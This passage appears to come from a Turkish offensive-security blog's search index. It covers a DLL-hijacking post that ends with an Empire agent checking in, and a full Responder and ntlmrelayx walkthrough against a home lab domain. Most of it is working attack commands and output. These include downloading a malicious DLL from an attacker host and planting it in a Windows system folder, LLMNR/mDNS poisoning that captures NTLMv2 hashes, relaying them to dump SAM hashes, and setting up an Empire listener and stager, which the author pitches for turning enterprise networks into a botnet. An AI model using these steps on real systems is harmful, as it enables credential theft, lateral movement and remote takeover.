derlenir1337@empire:~$ x86_64-w64-mingw32-gcc -shared hijack.c -o cscapi.dll  Kurban makinede DLL dosyası indirilir ve ilgili dizine kopyalanırC:\\Users\\zedel\\Downloads&gt;curl 192.168.1.40:80/cscapi.dll -o cscapi.dll  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 89588  100 89588    0     0   320k      0 --:--:-- --:--:-- --:--:--  321kC:\\Users\\zedel\\Downloads&gt;taskkill /f /im explorer.exeSUCCESS: The process \"explorer.exe\" with PID 6540 has been terminated.C:\\Users\\zedel\\Downloads&gt;curl 192.168.1.40:80/cscapi.dll -o cscapi.dll  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 89588  100 89588    0     0   390k      0 --:--:-- --:--:-- --:--:--  392kC:\\Users\\zedel\\Downloads&gt;copy cscapi.dll C:\\Windows\\SystemApps\\MicrosoftWindows.Client.Core_cw5n1h2txyewy\\cscapi.dll        1 file(s) copied.C:\\Users\\zedel\\Downloads&gt;explorer.exe [+] New agent USHLXYZD checked in(Empire: agents) &gt; agents┌Agents────┬───────────┬────────────┬──────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬─────────────┐│ ID       │ Name      │ Language   │ Internal IP  │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener    │├──────────┼───────────┼────────────┼──────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼─────────────┤│ USHLXYZD │ USHLXYZD  │ powershell │ 192.168.1.43 │ ZEDELEYICI\\zedel │ powershell │ 3240 │ 5/0.0 │ 2023-07-12 14:18:04 EDT │ dllhijacker ││          │           │            │              │                  │            │      │       │ (3 seconds ago)         │             │├──────────┼───────────┼────────────┼──────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼─────────────┤(Empire: agents) &gt; interact USHLXYZD(Empire: USHLXYZD) &gt; whoamiINFO: Tasked USHLXYZD to run Task 1 [*] Task 1 results receivedZEDELEYICI\\zedel"
  },
  
  {
    "title": "responder & ntlmrelay",
    "url": "/posts/responder-ve-ntlmrelay/",
    "categories": "internal, ADSecurity, mitigate, attacks",
    "tags": "ntlmrelay, non-user, relay-based",
    "date": "2023-07-10 00:00:00 +0300",
    





    
    "snippet": "Temelde mDNS yapısının istismarı ile gelişir. Client bir paylaşıma erişmek için mDNS kullanılır. Çünkü client tarafında DNS ayarları yapılandırılmamıştır ve yerel ağda da bu işi üstlenecek bir DNS ...",
    "content": "Temelde mDNS yapısının istismarı ile gelişir. Client bir paylaşıma erişmek için mDNS kullanılır. Çünkü client tarafında DNS ayarları yapılandırılmamıştır ve yerel ağda da bu işi üstlenecek bir DNS Server yapılandırılmamıştır. Hal böyle iken mDNS bu görevi üstlenir ve hub gibi tüm networke paylaşım adı olarak girilen verinin kimde olduğunu gönderir. Saldırgan bu trafiğe yanıt verir ve kurban credential girer. Girilen credsin NTLMv2 hali saldırgana iletilir. Bu hash bruteforce ile kırılabilir veya yerel ağda SMB relay yapılabilir. Sonucunda kullanıcı hashleri elde edilir ve networkte lateral movement gerçekleştirilir. Ancak buradaki önemli nokta, ntlmv2 hashin elde edildiği orijinal hedefe aynı hash ile saldırının gerçekleştirilmemesi. Çünkü istemci hangi challange yolladığını ve beklediği challange değerini saklamaktadır. İletilen challange değeri responder tarafından ayarlanabilir veya random bırakılabilir. Ancak bunu tutturmak yürüyerek aya gitmekten daha zordur. Dolayısı ile bir hedeften gelen hash verisini o hedef hariç tüm smb signing false olarak konfigüre edilen hedeflere relaylemek en mantıklısıdır.1337@empire:~$ crackmapexec smb 192.168.1.50                  SMB         192.168.1.50    445    WIN-507CQFD84EB  [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False)  Domain Controller makinesinde signing:True olarak ayarlanmış.1337@empire:~$ crackmapexec smb 192.168.1.27SMB         192.168.1.27    445    CLIENT           [*] Windows 10.0 Build 22621 x64 (name:CLIENT) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)1337@empire:~$ crackmapexec smb 192.168.1.37SMB         192.168.1.37    445    DESKTOP-3QJSCMN  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-3QJSCMN) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)  Domaine bağlı iki cihazda default olarak signing: False olarak ayarlanmış.  192.168.1.50 olan offensive.local e relay yapamazsın. Ancak 192.168.1.27 ve 192.168.1.37 olan clientlara smb relay yapabilirsin.1337@empire:~$ crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistSMB         192.168.1.27    445    CLIENT2          [*] Windows 10.0 Build 22621 x64 (name:CLIENT2) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)SMB         192.168.1.50    445    WIN-507CQFD84EB  [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False)SMB         192.168.1.37    445    DESKTOP-3QJSCMN  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-3QJSCMN) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)  Relay listesi oluşturulurResponder aktif edilir1337@empire:~$ sudo responder -I eth0 -dvFw[sudo] password for 1337:                                          __  .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0  To support this project:  Patreon -&gt; https://www.patreon.com/PythonResponder  Paypal  -&gt; https://paypal.me/PythonResponder  Author: Laurent Gaffie (laurent.gaffie@gmail.com)  To kill this script hit CTRL-C[+] Poisoners:    LLMNR                      [ON]    NBT-NS                     [ON]    MDNS                       [ON]    DNS                        [ON]    DHCP                       [ON][+] Servers:    HTTP server                [ON]    HTTPS server               [ON]    WPAD proxy                 [ON]    Auth proxy                 [OFF]    SMB server                 [ON]    Kerberos server            [ON]    SQL server                 [ON]    FTP server                 [ON]    IMAP server                [ON]    POP3 server                [ON]    SMTP server                [ON]    DNS server                 [ON]    LDAP server                [ON]    RDP server                 [ON]    DCE-RPC server             [ON]    WinRM server               [ON][+] HTTP Options:    Always serving EXE         [OFF]    Serving EXE                [OFF]    Serving HTML               [OFF]    Upstream Proxy             [OFF][+] Poisoning Options:    Analyze Mode               [OFF]    Force WPAD auth            [ON]    Force Basic Auth           [OFF]    Force LM downgrade         [OFF]    Force ESS downgrade        [OFF][+] Generic Options:    Responder NIC              [eth0]    Responder IP               [192.168.1.19]    Responder IPv6             [fe80::5acb:1933:215e:479f]    Challenge set              [random]    Don't Respond To Names     ['ISATAP'][+] Current Session Variables:    Responder Machine Name     [WIN-8GIZN6073G7]    Responder Domain Name      [DNSB.LOCAL]    Responder DCE-RPC Port     [49552][+] Listening for events...                                                                                                                                                                                                                 [*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...  Client tarafından bir paylaşım aratılır. Bu elle de yapılabilir, arka planda explorer.exe bunu düzenli olarak ta gerçekleştirebilir.[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\dumbass[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:df5a62f91b26fed7:5A855615494E14CC85B0159814B11387:0101000000000000002A978EEEB3D9015B2C3B23DDC3F6C80000000002000800500050005800540001001E00570049004E002D0032003100350042004C005000540053001231239004E002D0032003100350042004C00500054005300340042012312380054002E004C004F00430041004C1231230050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C0007000800002A978EEEB3D925621412312330003000000123123200000F2B72D7754D1AB61BA316B16DE6792123123803B27053812312300000000000900220063006900660073002F00620065006400610760061005F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       [*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\dumbass[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:fe0af26e72dd6dbc:A4214942607CFCE9544BB4DCCB7E4DDF:0101000000000000002A978EEEB3D9011C2FA526709975BA00000000020008005000512312340001001E00570049004E002D0032003100350042004C005000540053003400420012312303400570012312300540053003400420051002E0050005000580054002E004C004F00430041004C000300140050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C0007000800002A978EEEB3D90106000412312305F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       [*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\dumbass[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:7bbc33071a7c08c7:78121690657EC2FF1A792082B06AB062:0101000000000000002A978EEEB3D901F1DCE5152BD8F101231230002000800500050005800540001001E00570049004E002D0032003100350042004C0050005400530034004200510004003400570049004E002D0032012312305000540053003400420051002E0050005000580054002E0012312300000000000000000200000F2B72D7754D1AB61BA316B16DE6792EAD59F2D71231236CCE5D80A001000000000000000000000000000000000000900220063006900660073002F006200650064006100760061005F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       [*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\dumbass[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:8ba3107eb7b03112:F7835BEACEB9142045F271EBECC212312340053003400420051002E0050005000580054002E004C004F00430041004C000300140050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C00070008012621E12312300040002000000080030003000000000000000000000000123123006B000000000000000000                                                                                                                                                                                                                       [*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\dumbass[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:3ffae151253ea497:65FF9436191E421FC60B3C151D3FE54F:0101000000000000002A978EEEB3D9018F84B842A97123910000000002000800500050005800540001001E00570049004E002D0032003100350042004C0050005400530034004200510004003400570049004E002D0032003100350042004C00500054005300340042005100123123004C004F00430041004C000300140050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C0007000800002A978EEEB3D90106000400020000000800300030012312300000000200000F2B72D771231236DE6792EAD5123123123000000000000000900220063006900660073002F006200650064006100760061005F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       [*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\dumbass[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:33c72f25e8bfbcd9:2F7C59697E2F39834B383836A4454897:0101000000000000002A978E1231234002E004C004F00430041004C000300140050005001231230050005000580054002E004C004F00430041004C0007000800002A978EEEB3D90106000400020000000800300030000000000000000000000000200000F2B72D7754D1AB61BA316B16DE6792EAD59F2D7230194803B270538AD6CCE5D80A001000000000000000000000000000001231230660073002F006200650064006100760061005F00712312306B000000000000000000  Yemeği arkaplanda mDNS üzerinden bu şekilde arıyor.Responder bedava_yemek aramasına mDNS üzerinden yanıt verdiği için kurban tarafından istediği yere ulaşması için giriş yapması için yanıt göndermiştir. Kurban yanıtı bu şekilde görüntüler[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f[SMB] NTLMv2-SSP Username : OFFENSIVE\\buraya_parola_girecek_kadar_safim[SMB] NTLMv2-SSP Hash     : buraya_parola_girecek_kadar_safim::OFFENSIVE:09d512312305000580054002E004C004F00430041004C0007123123220063006900660073002F006200650064001123123005F00790065006D0065006B000000000000000000  Olur da, görseldeki ekrana veri girilirse responder bunu da yakalar ancak burada bir sorun var.  Bu girilen user ve parolalar doğru mu ? Diyelim bunları kırmak istiyoruz oturup normal bir hashin kırılması bile tamamen wordliste dayalı iken test esnasında bunun doğru olmadığı anlarda ne yapacağız ? Responder bunun doğruluğunu anlayamıyor.Responder ayarları yapılır1337@empire:~$ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf                                                                                          1337@empire:~$ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf  SMB relay yapabilmek için responderın SMB ve HTTP servislerini kapatıyoruz. Bu iki servisi ntlmrelayx ile açacağız. Çünkü relay yapabilmemiz için ntlmv2 hash elde edilmesi gerekiyor ve bu hashleri de ntlmrelayx altında smbserver ile yapacağız. (ntlmrelayx bunu otomatik yapıyor)  Responder tekrar çalıştırılır.1337@empire:~$ ntlmrelayx.py -t smb://192.168.1.27 -smb2support Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra[*] Protocol Client DCSYNC loaded..[*] Protocol Client RPC loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client SMB loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client SMTP loaded..[*] Running in relay mode to single host[*] Setting up SMB Server[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.27, attacking target smb://192.168.1.27[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/BURAYA_PAROLA_GIRECEK_KADAR_SAFIM FAILED  Relay ile girilen credentialların doğruluğu da kontrol edebiliyoruz1337@empire:~$ ntlmrelayx.py -smb2support -tf relaylistImpacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra[*] Protocol Client DCSYNC loaded..[*] Protocol Client RPC loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client SMB loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client SMTP loaded..[*] Running in relay mode to hosts in targetfile[*] Setting up SMB Server[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] SMBD-Thread-6 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED[*] SMBD-Thread-7 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.37[*] Authenticating against smb://192.168.1.37 as OFFENSIVE/HELLO SUCCEED[*] SMBD-Thread-7 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED[*] Service RemoteRegistry is in stopped state[*] Service RemoteRegistry is disabled, enabling it[*] Starting service RemoteRegistry[*] SMBD-Thread-9 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left![*] Target system bootKey: 0xcdf0b6b8e765491dbd53783671b07c09[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe123452931b73c59d25234289c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c23d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16a12342552159d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b123422f365125123123cf7e67dfe92600:::defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:afb74ae1912342a02512316d77f55:::user:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee71232145eba56341231546ad6:::[*] Done dumping SAM hashes for host: 192.168.1.37[*] Stopping service RemoteRegistry[*] Restoring the disabled state for service RemoteRegistry[*] SMBD-Thread-10 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left![*] SMBD-Thread-11 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!  192.168.1.27 kullanıcı verileri ile, 192.168.1.37 makinesindeki hashler dump edilir. Ama nasıl ?  192.168.1.27 makinesinden HELLO kullanıcısından gelen ntlmv2 hash, 192.168.1.37 smb sunucusuna iletildi ve geçerli olduğu görüldü. Çünkü HELLO kullanıcısının 192.168.1.37 makinesinde oturum açma yetkisi var. ntlmrelayx ile oturum açıldı hashler ve sam databasei dump edildi.  ntlmrelayx ile succeed olan hedeflerde komut çalıştırmak ta mümkün. Enterprise networklerde ortalığı bir anda botnet networküne çevirmek için empire dostumuz.1337@empire:~$ powershell-empire server[INFO]: csharpserver: [*] Starting Empire C# server [INFO]: Plugin csharpserver ran successfully! [INFO]: Compiler ready [INFO]: Empire starting up... [INFO]: Starkiller served at http://localhost:1337/index.html [INFO]: Started server process [287903] [INFO]: Waiting for application startup. [INFO]: Application startup complete. [INFO]: Uvicorn running on http://0.0.0.0:1337 (Press CTRL+C to quit)1337@empire:~$ powershell-empire client======================================================================================== [Empire] Post-Exploitation Framework======================================================================================== [Version] 5.4.2 | [Web] https://github.com/BC-SECURITY/Empire======================================================================================== [Starkiller] Web UI | [Web] https://github.com/BC-SECURITY/Starkiller======================================================================================== [Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/========================================================================================                   ███████╗███╗   ███╗██████╗ ██╗██████╗    ███████╗                                                            ██╔════╝████╗ ████║██╔══██╗██║██╔══██╗   ██╔════╝                                                            █████╗  ██╔████╔██║██████╔╝██║██████╔╝   █████╗                                                             ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║██╔══██╗   ██╔══╝                                                             ███████╗██║ ╚═╝ ██║██║     ██║██║  █████║███████╗                     ╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚════╝╚══════╝              412 modules currently loaded              0 listeners currently active              0 agents currently activeStarkiller is now the recommended way to use Empire.Try it out at http://localhost:1337/index.htmlINFO: Connected to localhost (Empire) &gt;(Empire) &gt; uselistener http id           http                                                                   authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y                  description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST               approach.                                                              category     client_server                                                         ┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐│ Name             │ Value                               │ Required │ Description                         │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Name             │ http                                │ True     │ Name for the listener.              │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Host             │ http://192.168.1.19                 │ True     │ Hostname/IP for staging.            │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    ││                  │                                     │          │ server.                             │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Port             │                                     │ True     │ Port for the listener.              │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ StagingKey       │ UFX&lt;G9@)s]m|VM+H_}Rr!Iw6&amp;igkD-&gt;4    │ True     │ Staging key for initial agent       ││                  │                                     │          │ negotiation.                        │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in ││                  │                                     │          │ seconds).                           │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  ││                  │                                     │          │ (0.0-1.0).                          │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    ││                  │                                     │          │ exiting                             │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   ││                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          ││                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     ││                  │ like Gecko                          │          │                                     │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ CertPath         │                                     │ False    │ Certificate path for https          ││                  │                                     │          │ listeners.                          │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ KillDate         │                                     │ False    │ Date for the listener to exit       ││                  │                                     │          │ (MM/dd/yyyy).                       │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      ││                  │                                     │          │ (09:00-17:00).                      │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Cookie           │ CLINMVkwtDrHQM                      │ False    │ Custom Cookie Name                  │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ StagerURI        │                                     │ False    │ URI for the stager. Must use        ││                  │                                     │          │ /download/. Example:                ││                  │                                     │          │ /download/stager.php                │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ UserAgent        │ default                             │ False    │ User-agent string to use for the    ││                  │                                     │          │ staging request (default, none, or  ││                  │                                     │          │ other).                             │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  ││                  │                                     │          │ none, or other).                    │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   ││                  │                                     │          │ ([domain\\]username:password) to use ││                  │                                     │          │ for request (default, none, or      ││                  │                                     │          │ other).                             │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  ││                  │                                     │          │ communicate with your Slack         ││                  │                                     │          │ instance.                           │├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature ││                  │                                     │          │ using TLS ciphers.                  │└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘(Empire: uselistener/http) &gt; set Name pwnypwnyINFO: Set Name to pwnypwny (Empire: uselistener/http) &gt; set Host 192.168.1.19INFO: Set Host to 192.168.1.19 (Empire: uselistener/http) &gt; set Port 9999INFO: Set Port to 9999 (Empire: uselistener/http) &gt; execute[+] Listener pwnypwny successfully started(Empire: uselistener/http) &gt; back(Empire) &gt; usestager multi_launcher id           multi_launcher                                         authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y  description  Generates a one-liner stage0 launcher for Empire.     ┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐│ Name             │ Value              │ Required │ Description                         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Listener         │                    │ True     │ Listener to generate stager for.    │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Language         │ powershell         │ True     │ Language of the stager to generate. │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       ││                  │                    │          │ connecting.                         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ OutFile          │                    │ False    │ Filename that should be used for    ││                  │                    │          │ the generated output.               │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Base64           │ True               │ True     │ Switch. Base64 encode the output.   │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      ││                  │                    │          │ powershell code, uses the           ││                  │                    │          │ ObfuscateCommand for obfuscation    ││                  │                    │          │ types. For powershell only.         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ ObfuscateCommand │ Token\\All\\1        │ False    │ The Invoke-Obfuscation command to   ││                  │                    │          │ use. Only used if Obfuscate switch  ││                  │                    │          │ is True. For powershell only.       │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ SafeChecks       │ True               │ True     │ Switch. Checks for LittleSnitch or  ││                  │                    │          │ a SandBox, exit the staging process ││                  │                    │          │ if true. Defaults to True.          │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ UserAgent        │ default            │ False    │ User-agent string to use for the    ││                  │                    │          │ staging request (default, none, or  ││                  │                    │          │ other).                             │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Proxy            │ default            │ False    │ Proxy to use for request (default,  ││                  │                    │          │ none, or other).                    │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ ProxyCreds       │ default            │ False    │ Proxy credentials                   ││                  │                    │          │ ([domain\\]username:password) to use ││                  │                    │          │ for request (default, none, or      ││                  │                    │          │ other).                             